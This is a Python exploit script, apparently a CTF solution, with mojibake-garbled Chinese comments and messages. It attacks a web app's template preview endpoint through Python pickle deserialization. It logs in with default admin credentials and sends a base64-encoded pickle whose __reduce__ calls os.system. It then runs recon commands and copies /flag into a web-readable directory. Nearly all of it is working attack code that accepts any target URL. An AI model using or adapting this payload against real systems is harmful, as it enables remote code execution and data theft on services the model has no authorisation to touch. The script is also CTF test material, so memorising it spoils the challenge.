#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CTFé¢˜ç›®å®Œæ•´æ”»å‡»æ¼”ç¤ºè„šæœ¬
æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨pickleååºåˆ—åŒ–æ¼æ´è·å–flag
"""

import requests
import pickle
import base64
import os
import json
import time

class RCEPayload:
    """RCE payloadç±»"""
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        return (os.system, (self.command,))

class ExploitDemo:
    """æ”»å‡»æ¼”ç¤ºç±»"""
    
    def __init__(self, target_url="http://localhost:5000"):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def login(self, username="admin", password="admin@2024"):
        """ç™»å½•ç³»ç»Ÿ"""
        print(f"[+] å°è¯•ç™»å½•: {username}")
        
        login_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(
            f"{self.target_url}/login",
            data=login_data,
            allow_redirects=True
        )
        
        if "ä»ªè¡¨æ¿" in response.text or "dashboard" in response.url:
            print("[+] ç™»å½•æˆåŠŸï¼")
            return True
        else:
            print("[-] ç™»å½•å¤±è´¥")
            return False
    
    def generate_payload(self, command):
        """ç”Ÿæˆpickle payload"""
        payload_obj = RCEPayload(command)
        pickled = pickle.dumps(payload_obj)
        encoded = base64.b64encode(pickled).decode('utf-8')
        return f"pickle:{encoded}"
    
    def exploit(self, command):
        """æ‰§è¡Œæ”»å‡»"""
        print(f"[+] ç”Ÿæˆpayloadæ‰§è¡Œå‘½ä»¤: {command}")
        
        payload = self.generate_payload(command)
        
        attack_data = {
            "content": "æ”»å‡»æµ‹è¯•æ¨¡æ¿ {{test_var}}",
            "variables": payload
        }
        
        print("[+] å‘é€æ”»å‡»è½½è·...")
        
        response = self.session.post(
            f"{self.target_url}/admin/templates/preview",
            json=attack_data,
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            print("[+] æ”»å‡»è½½è·å‘é€æˆåŠŸ")
            result = response.json()
            
            if result.get('success'):
                print("[+] å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼")
                return True
            else:
                print(f"[-] æ‰§è¡Œå¤±è´¥: {result.get('error', 'æœªçŸ¥é”™è¯¯')}")
        else:
            print(f"[-] HTTPé”™è¯¯: {response.status_code}")
            
        return False
    
    def read_flag(self):
        """è¯»å–flagæ–‡ä»¶"""
        print("\n" + "="*50)
        print("å°è¯•è¯»å–flagæ–‡ä»¶...")
        print("="*50)
        
        # ç”±äºpickle.loadsä¼šæ‰§è¡Œå‘½ä»¤ä½†ä¸è¿”å›è¾“å‡ºï¼Œ
        # æˆ‘ä»¬éœ€è¦å°†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªå¯è®¿é—®çš„ä½ç½®
        commands = [
            "cat /flag > static/flag.txt",  # å°†flagå†™å…¥é™æ€æ–‡ä»¶ç›®å½•
            "cat /flag > templates/flag.txt",  # å¤‡ç”¨ä½ç½®
            "cp /flag /tmp/flag.txt",  # å¤åˆ¶åˆ°tmpç›®å½•
        ]
        
        for cmd in commands:
            if self.exploit(cmd):
                time.sleep(1)  # ç­‰å¾…æ–‡ä»¶å†™å…¥
                
                # å°è¯•è®¿é—®flagæ–‡ä»¶
                try:
                    flag_response = self.session.get(f"{self.target_url}/static/flag.txt")
                    if flag_response.status_code == 200 and "wmctf{" in flag_response.text:
                        print(f"[+] Flagè·å–æˆåŠŸ: {flag_response.text.strip()}")
                        return flag_response.text.strip()
                except:
                    pass
        
        print("[-] æ— æ³•ç›´æ¥è·å–flagå†…å®¹ï¼Œä½†å‘½ä»¤å¯èƒ½å·²æ‰§è¡Œ")
        return None
    
    def demonstrate_rce(self):
        """æ¼”ç¤ºRCEèƒ½åŠ›"""
        print("\n" + "="*50)
        print("æ¼”ç¤ºè¿œç¨‹ä»£ç æ‰§è¡Œèƒ½åŠ›...")
        print("="*50)
        
        demo_commands = [
            "whoami > static/whoami.txt",
            "id > static/id.txt", 
            "pwd > static/pwd.txt",
            "ls -la / > static/ls.txt",
            "ps aux > static/ps.txt"
        ]
        
        for cmd in demo_commands:
            print(f"\n[+] æ‰§è¡Œ: {cmd}")
            if self.exploit(cmd):
                time.sleep(0.5)
                
                # å°è¯•è·å–ç»“æœ
                filename = cmd.split('>')[-1].strip()
                try:
                    result = self.session.get(f"{self.target_url}/{filename}")
                    if result.status_code == 200:
                        print(f"[+] è¾“å‡º: {result.text[:200]}...")
                except:
                    pass

def main():
    """ä¸»å‡½æ•°"""
    print("="*60)
    print("CTFé¢˜ç›® - å‘˜å·¥ç»©æ•ˆç®¡ç†ç³»ç»Ÿæ¼æ´åˆ©ç”¨æ¼”ç¤º")
    print("æ¼æ´ç±»å‹: Python Pickle ååºåˆ—åŒ– RCE")
    print("="*60)
    
    # è·å–ç›®æ ‡URL
    target = input("è¾“å…¥ç›®æ ‡URL (é»˜è®¤: http://localhost:5000): ").strip()
    if not target:
        target = "http://localhost:5000"
    
    # åˆ›å»ºæ”»å‡»å®ä¾‹
    exploit = ExploitDemo(target)
    
    # ç™»å½•
    if not exploit.login():
        print("[-] æ— æ³•ç™»å½•ï¼Œè¯·æ£€æŸ¥ç›®æ ‡ç³»ç»Ÿå’Œå‡­æ®")
        return
    
    # æ¼”ç¤ºåŸºæœ¬RCE
    exploit.demonstrate_rce()
    
    # è·å–flag
    flag = exploit.read_flag()
    
    if flag:
        print(f"\nğŸ‰ æ”»å‡»æˆåŠŸï¼Flag: {flag}")
    else:
        print("\nâš ï¸  æ”»å‡»è½½è·å·²å‘é€ï¼Œä½†æ— æ³•ç›´æ¥è·å–flagå†…å®¹")
        print("   å»ºè®®æ£€æŸ¥æœåŠ¡å™¨æ—¥å¿—æˆ–ä½¿ç”¨åå¼¹shell")
    
    print("\n" + "="*60)
    print("æ”»å‡»æ¼”ç¤ºå®Œæˆï¼")
    print("="*60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nç”¨æˆ·ä¸­æ–­æ”»å‡»")
    except Exception as e:
        print(f"\næ”»å‡»è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}") 